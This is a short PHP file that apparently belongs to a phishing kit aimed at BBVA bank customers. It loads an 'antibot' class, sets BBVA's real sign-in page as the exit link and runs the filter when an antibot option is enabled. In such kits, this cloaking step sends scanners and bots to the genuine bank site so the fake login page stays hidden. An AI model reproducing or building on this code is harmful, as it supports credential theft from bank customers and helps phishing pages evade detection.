<?php 
require (__DIR__).'/config.php';
require (__DIR__).'/lib/frm.php';


require (__DIR__).'/botMother/botMother.php';
$m = new botMother();
$m->setExitLink("https://www.bbva.es/nimbus/signin.html");
$m->setGeoFilter("");
$m->setLicenseKey(""); 
$m->setTestMode(false);

if(strtolower($antibot)=="yes"){
	$m->run();
}


?>